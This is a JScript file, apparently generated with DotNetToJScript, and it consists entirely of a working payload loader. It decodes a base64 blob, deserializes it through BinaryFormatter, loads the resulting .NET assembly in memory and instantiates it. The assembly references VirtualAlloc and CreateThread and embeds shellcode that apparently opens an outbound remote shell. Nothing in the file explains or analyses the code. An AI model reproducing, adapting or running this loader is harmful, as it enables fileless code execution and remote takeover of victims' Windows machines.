function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABgAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAiG/YYgAAAAAA"+
"AAAA4AAiIAsBMAAADgAAAAgAAAAAAACaKwAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAASCsA"+
"AE8AAAAAQAAADAQAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAABAqAAAcAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAADADAAAACAAAAAOAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAADAQAAABA"+
"AAAABgAAABAAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAWAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAHwrAAAAAAAASAAAAAIABQDMIAAARAkAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzAHAF8AAAAB"+
"AAARAigPAAAKIBoBAACNEgAAASXQAQAABCgQAAAKJY5pCgJ+EQAACiAAEAAAIAAwAAAfQCgGAAAG"+
"CxYHBigSAAAKAn4RAAAKFgd+EQAAChZ+EQAACigFAAAGFSgDAAAGJioacxMAAAp6IgMoFAAACiYq"+
"AEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAGQDAAAjfgAA0AMAABAEAAAjU3Ry"+
"aW5ncwAAAADgBwAABAAAACNVUwDkBwAAEAAAACNHVUlEAAAA9AcAAFABAAAjQmxvYgAAAAAAAAAC"+
"AAABV5UCNAkCAAAA+gEzABYAAAEAAAAZAAAABAAAAAEAAAAHAAAAFwAAABQAAAAPAAAAAQAAAAEA"+
"AAABAAAAAwAAAAEAAAABAAAAAgAAAAEAAAAAAIgCAQAAAAAABgDLATYDBgA4AjYDBgAYAfUCDwBW"+
"AwAABgBAAaMCBgCuAaMCBgCPAaMCBgAfAqMCBgDrAaMCBgAEAqMCBgBXAaMCBgAsARcDBgAKARcD"+
"BgByAaMCBgDSA5wCBgDvADYDBgDUAJwCBgBWApwCBgCIAzYDBgDzA5wCBgC5AJwCBgDuApwCBgBz"+
"AhcDBgC1ApwCCgCkA/UCAAAAAGMAAAAAAAEAAQABABAAlwMAAD0AAQABAAABAABsAAAAPQABAAgA"+
"EwEAAAoAAABFAAIACAAzATEAQgAAAAAAgACRIJQARgABAAAAAACAAJEgrABOAAUAAAAAAIAAkSDF"+
"A1gACwBQIAAAAACGGOgCBgANALsgAAAAAIEArABeAA0AuyAAAAAAgQCUAGgAEwDCIAAAAACGAKED"+
"EAAXAAAAAQCsAwAAAgBnAgAAAwDeAAAABADZAwAAAQBlAwAAAgBbAgAAAwC2AwAABADcAgAABQB4"+
"AwAABgChAAAAAQDMAAAAAgAIAwAAAQABAAAAAgAHAAAAAwDXAgAABAAoAAAABQAuAAAABgBaAAAA"+
"AQDSAgAAAgAHAAAAAwAuAAAABABgAAAAAQBuAgkA6AIBABEA6AIGABkA6AIKACkA6AIQADEA6AIQ"+
"ADkA6AIQAEEA6AIQAEkA6AIQAFEA6AIQAFkA6AIQAGEA6AIVAGkA6AIQAHEA6AIQAIEA6AIGAHkA"+
"6AIGAJkA6QMfALEAzQInALkACQQqAMEA6AIGAMkA4wMzAC4ACwBwAC4AEwB5AC4AGwCYAC4AIwCh"+
"AC4AKwC2AC4AMwDgAC4AOwDgAC4AQwChAC4ASwDmAC4AUwDgAC4AWwDgAC4AYwALAS4AawA1AUMA"+
"WwBCAWMAcwBIAQEAGgEAAAQAGgB7AkEBAwCUAAEAAAEFAKwAAQAAAQcAxQMBAKArAAABAASAAAAB"+
"AAAAAAAAAAAAAAAAAPkDAAACAAAAAAAAAAAAAAA5AIsAAAAAAAIAAAAAAAAAAAAAADkAnAIAAAAA"+
"BAADAAAAAAAAemVybzEAdjEAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT0yODIAemVybzIAdjIA"+
"RjY2NEVDMzFFQjQ1QjFFRTFFMTIyMENBQjNGQ0M2RTMyRjc2Q0RDMwB6ZXJvMwB2MwA8TW9kdWxl"+
"PgA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz4AbXNjb3JsaWIAVmlydHVhbEFsbG9jAGxw"+
"VGhyZWFkSWQAQ3JlYXRlVGhyZWFkAFJ1bnRpbWVGaWVsZEhhbmRsZQBoSGFuZGxlAFZhbHVlVHlw"+
"ZQBmbEFsbG9jYXRpb25UeXBlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1"+
"dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVB"+
"dHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0"+
"dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlv"+
"bkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVj"+
"dEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRy"+
"aWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBkd1N0YWNrU2l6ZQBkd1Np"+
"emUAcGF0aABNYXJzaGFsAGtlcm5lbDMyLmRsbABFeGFtcGxlQXNzZW1ibHkuZGxsAFN5c3RlbQBT"+
"eXN0ZW0uUmVmbGVjdGlvbgBOb3RJbXBsZW1lbnRlZEV4Y2VwdGlvbgBaZXJvAHplcm8AYWRkcgBs"+
"cFBhcmFtZXRlcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAGR3TWlsbGlzZWNvbmRz"+
"AFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNl"+
"cnZpY2VzAERlYnVnZ2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRlcwBkd0NyZWF0aW9uRmxhZ3MA"+
"UnVudGltZUhlbHBlcnMAVGVzdENsYXNzAFJ1blByb2Nlc3MAbHBBZGRyZXNzAGxwU3RhcnRBZGRy"+
"ZXNzAFdhaXRGb3JTaW5nbGVPYmplY3QAZmxQcm90ZWN0AFN0YXJ0AEluaXRpYWxpemVBcnJheQBF"+
"eGFtcGxlQXNzZW1ibHkAQ29weQAAAAAAAABehiKsmLbeRIiDTHkaJSQlAAQgAQEIAyAAAQUgAQER"+
"EQQgAQEOBCABAQIEBwIIGAcAAgESURFVAgYYCAAEAR0FCBgIBQABEmUOCLd6XFYZNOCJAwYREAcA"+
"BBgYCQkJCQAGGBgJGBgJGAUAAgkYCQkgBhgYCBgYCBgHIAQYGAgICAgBAAgAAAAAAB4BAAEAVAIW"+
"V3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAUAQAPRXhhbXBsZUFzc2VtYmx5AAApAQAk"+
"RXhhbXBsZSBBc3NlbWJseSBmb3IgRG90TmV0VG9KU2NyaXB0AAAFAQAAAAAkAQAfQ29weXJpZ2h0"+
"IMKpIEphbWVzIEZvcnNoYXcgMjAxNwAAKQEAJDU2NTk4ZjFjLTZkODgtNDk5NC1hMzkyLWFmMzM3"+
"YWJlNTc3NwAADAEABzEuMC4wLjAAAAUBAAEAAAQBAAAAAAAAAAAAAIhv2GIAAAAAAgAAABwBAAAs"+
"KgAALAwAAFJTRFPlVyv72Iw5QYeEWeUnow8GAQAAAEM6XFVzZXJzXGNtZG5jbnRybFxzb3VyY2Vc"+
"cmVwb3NcRG90TmV0VG9KU2NyaXB0XEV4YW1wbGVBc3NlbWJseVxvYmpcUmVsZWFzZVxFeGFtcGxl"+
"QXNzZW1ibHkucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAcCsAAAAAAAAAAAAAiisAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHwrAAAAAAAAAAAA"+
"AAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEPzoggAAAGCJ5THAZItQMItSDItS"+
"FItyKA+3SiYx/6w8YXwCLCDBzw0Bx+LyUleLUhCLSjyLTBF440gB0VGLWSAB04tJGOM6SYs0iwHW"+
"Mf+swc8NAcc44HX2A334O30kdeRYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4F9fWosS"+
"641daDMyAABod3MyX1RoTHcmB//VuJABAAApxFRQaCmAawD/1VBQUFBAUEBQaOoP3+D/1ZdowKgB"+
"M2gCABFcieZqEFZXaJmldGH/1YXAdA9mi0YChuBAhuBmiUYC6+JqAGoEVldoAtnIX//VizZqQGgA"+
"EAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//VAcMpxnXuwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAAB"+
"AAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAALADAAAAAAAAAAAAALADNAAAAFYA"+
"UwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/"+
"AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAA"+
"AAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAQQAwAAAQBTAHQAcgBpAG4AZwBG"+
"AGkAbABlAEkAbgBmAG8AAADsAgAAAQAwADAAMAAwADAANABiADAAAABiACUAAQBDAG8AbQBtAGUA"+
"bgB0AHMAAABFAHgAYQBtAHAAbABlACAAQQBzAHMAZQBtAGIAbAB5ACAAZgBvAHIAIABEAG8AdABO"+
"AGUAdABUAG8ASgBTAGMAcgBpAHAAdAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAA"+
"AAAAAAAASAAQAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEUAeABhAG0AcABs"+
"AGUAQQBzAHMAZQBtAGIAbAB5AAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4A"+
"MAAuADAALgAwAAAASAAUAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABFAHgAYQBtAHAAbABl"+
"AEEAcwBzAGUAbQBiAGwAeQAuAGQAbABsAAAAYgAfAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcA"+
"aAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAASgBhAG0AZQBzACAARgBvAHIAcwBoAGEAdwAg"+
"ADIAMAAxADcAAAAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAA"+
"UAAUAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEUAeABhAG0AcABsAGUAQQBz"+
"AHMAZQBtAGIAbAB5AC4AZABsAGwAAABAABAAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEUA"+
"eABhAG0AcABsAGUAQQBzAHMAZQBtAGIAbAB5AAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBz"+
"AGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMA"+
"aQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAACAAAAwAAACcOwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVj"+
"dGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}